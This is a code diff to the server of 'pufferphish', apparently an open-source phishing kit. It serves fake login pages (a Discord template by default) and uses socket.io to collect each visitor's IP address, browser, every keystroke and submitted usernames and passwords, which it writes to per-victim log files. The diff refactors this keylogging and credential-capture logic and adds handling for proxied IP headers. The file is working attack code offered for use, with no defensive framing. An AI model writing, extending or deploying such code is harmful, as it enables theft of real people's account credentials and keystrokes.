@@ -6,7 +6,7 @@ import http from "http"
 import Logger from "./log.js"
 import { fileURLToPath } from 'url';
 
-// i found the dirname thing on stackoveflow thanks i guess
+// i found the dirname thing on stackoveflow - thanks i guess
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express()
 const server = http.createServer(app)
@@ -17,10 +17,8 @@ let config = {}
 try{
   config = JSON.parse(fs.readFileSync("config.json"))
 }catch(err){
-  logger.error("Error reading 'config.json' | "+ err)
+  logger.error("Error reading 'config.json': "+ err)
 }
-
-logger.config(config)
 
 const template = path.join(
   __dirname, 
@@ -45,11 +43,12 @@ app.all(config["path"] || "/", (req,res)=>{
     "templates", 
     (config["template"] || "discord")+".html"
   ))
-  logger.info("Request from '"+req.ip+"' - accepted")
+  logger.info("Accepted request from '"+req.ip)
 })
 
 app.all("/ip", (req,res)=>{
-  return res.json({ ip: req.ip })
+  const ip = req.get("X-Real-IP") ? req.get("X-Real-IP") : req.ip
+  return res.json({ ip: ip })
 })
 
 app.all("*", (req,res)=>{
@@ -57,25 +56,55 @@ app.all("*", (req,res)=>{
   res.status(404).send("404 not found")
 })
 
-io.on("connection", socket => { 
-    socket.on("info", data =>{
-      let log = `IP: ${data["ip"]} BROWSER: ${data["browser"]}`
-      socket.ip = data["ip"]
-      logger.log("Socket "+socket.ip+" | [INFO]    "+log)
-    })
+io.on("connection", s => { 
+  s.on("info", data =>{
+    s.ip = data["ip"]
+    logger.info(`New connection from ${s.ip}`)
+    let log = `==============================
+New connection at ${logger.date()}
+IP Address: ${data["ip"]}
+Browser: ${data["browser"]}`
+    logger.log(s.ip, "info", log)
+  })
 
-    socket.on("key", data => {
-      let log = `ACTIVE: ${data["active"]} KEY: ${data["key"]}`
-      logger.log("Socket "+socket.ip+" | [KEYLOG]  "+log)
-    })
+  s.on("disconnect", ()=>{
+    if (s.ip === undefined) {
+      logger.info("Dead socket connection, disconnecting")
+      return s.disconnect()
+    }
 
-    socket.on("submit", data => {
-      let log = `USER: ${data["user"]} PASS: ${data["pass"]}`
-      logger.log("Socket "+socket.ip+" | [SUBMIT]  "+log)
-    })
+    logger.info(`Connection closed with ${s.ip}`)
+    let log = `\nEnded connection at ${logger.date()}
+==============================`
+    logger.log(s.ip, "info", log)
+  })
+
+  s.on("key", data => {
+    if (s.ip === undefined) {
+      logger.info("Dead socket connection, disconnecting")
+      return s.disconnect()
+    }
+    
+    logger.log(s.ip, "keys", data["key"])
+  })
+
+  s.on("submit", data => {
+    if (s.ip === undefined) {
+      logger.info("Dead socket connection, disconnecting")
+      return s.disconnect()
+    }
+
+    let log = `==============================
+Username: ${data["user"]} 
+Password: ${data["pass"]}
+==============================`
+    logger.log(s.ip, "sumbit", log)
+  })
 })
 
 server.listen(config["port"] || 8080, () => {
   logger.banner()
+  const version = JSON.parse(fs.readFileSync("package.json"))["version"]
+  logger.success("Started pufferphish version "+version+" | github.com/ngn13/pufferphish")
   logger.success("Server is listening on port "+server.address().port)
 })
